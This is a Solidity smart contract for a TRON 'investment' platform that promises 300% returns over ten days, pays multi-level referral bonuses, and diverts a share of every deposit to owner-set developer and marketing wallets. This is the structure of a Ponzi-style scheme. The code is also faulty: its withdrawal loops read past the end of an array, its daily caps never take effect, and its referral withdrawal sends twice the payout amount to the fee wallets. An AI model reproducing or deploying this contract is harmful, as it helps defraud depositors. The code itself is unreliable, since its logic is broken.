//SourceUnit: tronnow.sol

pragma solidity 0.5.10;



contract Ownable {

    address public owner;



    constructor() public {

        owner = msg.sender;

    }

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}





contract tronnow is Ownable {

    using SafeMath for uint256;



    uint256 public constant DEVELOPER_RATE = 5;         

    uint256 public constant MARKETING_RATE = 10;            

    uint256 public constant AUTOCOMPOUND = 50;  

    uint256 private max_withdraw = 5000000000;

    uint256 private max_withdraw_ref = 1000000000;

    

    

    struct PlayerDeposit {

        uint256 amount;

        uint256 totalWithdraw;

        uint256 time;

    }



    struct PlayerWitdraw{

        uint256 time;

        uint256 amount;

    }





    struct Player {

        address referral;

        uint256 dividends;

        uint256 referral_bonus;

        uint256 last_payout;

        uint256 last_withdrawal;

        uint256 last_withdrawal_ref;

        uint256 total_invested;

        uint256 total_withdrawn;

        uint256 total_referral_bonus;

        PlayerDeposit[] deposits;

        PlayerWitdraw[] withdrawals;

        mapping(uint8 => uint256) referrals_per_level;

    }



    address public owner;



    uint8 public investment_days;

    uint256 public investment_perc;



    uint256 public total_investors;

    uint256 public total_invested;

    uint256 public total_withdrawn;

    uint256 public total_referral_bonus;



    uint256 public soft_release;

    uint256 public full_release;



    uint8[] public referral_bonuses;



    mapping(address => Player) public players;



    event Deposit(address indexed addr, uint256 amount);

    event Withdraw(address indexed addr, uint256 amount);

    event Reinvest(address indexed addr, uint256 amount);

    event Withdraw_ref(address indexed addr, uint256 amount);

    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);



    address payable private developerAccount_;

    address payable private marketingAccount_;



    constructor() public {

        owner = msg.sender;



        investment_days = 10;

        investment_perc = 300;



        referral_bonuses.push(100);

        referral_bonuses.push(50);

        referral_bonuses.push(30);

        referral_bonuses.push(20);



    }



    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {

        require(_newMarketingAccount != address(0));

        marketingAccount_ = _newMarketingAccount;

    }



    function getMarketingAccount() public view onlyOwner returns (address) {

        return marketingAccount_;

    }



    function setDeveloperAccount(address payable _newDeveloperAccount) public onlyOwner {

        require(_newDeveloperAccount != address(0));

        developerAccount_ = _newDeveloperAccount;

    }



    function getDeveloperAccount() public view onlyOwner returns (address) {

        return developerAccount_;

    }





    function deposit(address _referral) external payable {

         require(msg.value >= 10e7, "Zero amount");

        require(msg.value >= 100000000, "Minimal deposit: 100 TRX");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 1500, "Max 1500 deposits per address");





        _setReferral(msg.sender, _referral);



        player.deposits.push(PlayerDeposit({

            amount: msg.value,

            totalWithdraw: 0,

            time: uint256(block.timestamp)

        }));



        if(player.total_invested == 0x0){

            total_investors += 1;

        }



        player.total_invested += msg.value;

        total_invested += msg.value;



        _referralPayout(msg.sender, msg.value);

        

        uint256 developerPercentage = (msg.value.mul(DEVELOPER_RATE)).div(100);

        developerAccount_.transfer(developerPercentage);

        uint256 marketingPercentage = (msg.value.mul(MARKETING_RATE)).div(100);

        marketingAccount_.transfer(marketingPercentage);

        

        emit Deposit(msg.sender, msg.value);

    }



    function _setReferral(address _addr, address _referral) private {

        if(players[_addr].referral == address(0)) {

            players[_addr].referral = _referral;



            for(uint8 i = 0; i < referral_bonuses.length; i++) {

                players[_referral].referrals_per_level[i]++;

                _referral = players[_referral].referral;

                if(_referral == address(0)) break;

            }

        }

    }



    function _referralPayout(address _addr, uint256 _amount) private {

        address ref = players[_addr].referral;



        for(uint8 i = 0; i < referral_bonuses.length; i++) {

            if(ref == address(0)) break;

            uint256 bonus = _amount * referral_bonuses[i] / 1000;



            if(uint256(block.timestamp) < full_release){

                bonus = bonus * 2;

            }



            players[ref].referral_bonus += bonus;

            players[ref].total_referral_bonus += bonus;

            total_referral_bonus += bonus;



            emit ReferralPayout(ref, bonus, (i+1));

            ref = players[ref].referral;

        }

    }



    function withdraw() payable external {

        Player storage player = players[msg.sender];



        _payout(msg.sender);





        if((player.last_withdrawal == 0) || (block.timestamp > player.last_withdrawal + 1 days)){

            player.last_withdrawal = block.timestamp;

        }



        uint256 withdraws = 0;

        for(uint256 b = player.withdrawals.length; b > 0 ;b--){

            if(player.withdrawals[b].time >= player.last_withdrawal && player.withdrawals[b].time <= (player.last_withdrawal + 1 days)){

                withdraws += player.withdrawals[b].amount;

            }

        }



        require(withdraws <= max_withdraw,"Maximum withdrawals is 5,000 trx");





        if(withdraws <= max_withdraw){



            require(player.dividends > 0, "Zero amount");



            uint256 amount = player.dividends;



                if(amount > max_withdraw){

                    uint256 remaining = (amount - max_withdraw);

                    amount = max_withdraw;

                    player.dividends = remaining;



                }else{

                    player.dividends = 0;

                }





        uint256 _50Percent = amount.mul(AUTOCOMPOUND).div(100);

        uint256 amountLess50 = amount.sub(_50Percent);



        autoreinvest(_50Percent);



        player.dividends = 0;

        player.total_withdrawn += amountLess50;

        total_withdrawn += amountLess50;





        msg.sender.transfer(amountLess50);

        

        uint256 developerPercentage = (amountLess50.mul(DEVELOPER_RATE)).div(100);

        developerAccount_.transfer(developerPercentage);

        uint256 marketingPercentage = (amountLess50.mul(MARKETING_RATE)).div(100);

        marketingAccount_.transfer(marketingPercentage);



        emit Withdraw(msg.sender, amount);

    }

    }

    

    function withdraw_ref() payable external{

    

            Player storage player = players[msg.sender];



        _payout(msg.sender);

        

        if((player.last_withdrawal_ref == 0) || (block.timestamp > player.last_withdrawal_ref + 1 days)){

            player.last_withdrawal_ref = block.timestamp;

        }



        uint256 withdraws = 0;

        for(uint256 b = player.withdrawals.length; b > 0 ;b--){

            if(player.withdrawals[b].time >= player.last_withdrawal && player.withdrawals[b].time <= (player.last_withdrawal + 1 days)){

                withdraws += player.withdrawals[b].amount;

            }

        }



        require(withdraws <= max_withdraw_ref,"Maximum withdrawals is 1,000 trx");





        if(withdraws <= max_withdraw){



            require(player.referral_bonus  > 0, "Zero amount");



            uint256 amount = player.referral_bonus ;



                if(amount > max_withdraw){

                    uint256 remaining = (amount - max_withdraw);

                    amount = max_withdraw;

                    player.referral_bonus  = remaining;



                }else{

                    player.referral_bonus  = 0;

                }









        player.referral_bonus = 0;

        player.total_withdrawn += amount;

        total_withdrawn += amount;



        msg.sender.transfer(amount);

        uint256 developerPercentage = (amount.mul(AUTOCOMPOUND)).div(100);

        developerAccount_.transfer(developerPercentage);

        uint256 marketingPercentage = (amount.mul(AUTOCOMPOUND)).div(100);

        marketingAccount_.transfer(marketingPercentage);



        emit Withdraw(msg.sender, amount);

    }

    }

    

    function autoreinvest(uint256 _amount)private{

        Player storage player = players[msg.sender];



        player.deposits.push(PlayerDeposit({

            amount: _amount,

            totalWithdraw: 0,

            time: uint256(block.timestamp)

        }));



        player.total_invested += _amount;

        total_invested += _amount;

    }  





    function _payout(address _addr) private {

        uint256 payout = this.payoutOf(_addr);



        if(payout > 0) {

            _updateTotalPayout(_addr);

            players[_addr].last_payout = uint256(block.timestamp);

            players[_addr].dividends += payout;

        }

    }





    function _updateTotalPayout(address _addr) private{

        Player storage player = players[_addr];



        for(uint256 i = 0; i < player.deposits.length; i++) {

            PlayerDeposit storage dep = player.deposits[i];



            uint256 time_end = dep.time + investment_days * 86400;

            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;

            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);



            if(from < to) {

                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;

            }

        }

    }



    function payoutOf(address _addr) view external returns(uint256 value) {

        Player storage player = players[_addr];



        for(uint256 i = 0; i < player.deposits.length; i++) {

            PlayerDeposit storage dep = player.deposits[i];



            uint256 time_end = dep.time + investment_days * 86400;

            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;

            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);



            if(from < to) {

                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;

            }

        }



        return value;

    }



    function contractInfo() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {

        return (total_invested, total_investors, total_withdrawn, total_referral_bonus);

    }



    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals) {

        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);



        for(uint8 i = 0; i < referral_bonuses.length; i++) {

            referrals[i] = player.referrals_per_level[i];

        }

        return (

            payout + player.dividends,

            player.referral_bonus,

            player.total_invested,

            player.total_withdrawn,

            player.total_referral_bonus,

            referrals

        );

    }



    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {

        Player storage player = players[_addr];

        uint256[] memory _endTimes = new uint256[](player.deposits.length);

        uint256[] memory _amounts = new uint256[](player.deposits.length);

        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);



        for(uint256 i = 0; i < player.deposits.length; i++) {

          PlayerDeposit storage dep = player.deposits[i];



          _amounts[i] = dep.amount;

          _totalWithdraws[i] = dep.totalWithdraw;

          _endTimes[i] = dep.time + investment_days * 86400;

        }

        return (

          _endTimes,

          _amounts,

          _totalWithdraws

        );

    }

}



library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }

        uint256 c = a * b;

        require(c / a == b);

        return c;

    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b > 0);

        uint256 c = a / b;

        return c;

    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b <= a);

        uint256 c = a - b;

        return c;

    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a);

        return c;

    }

}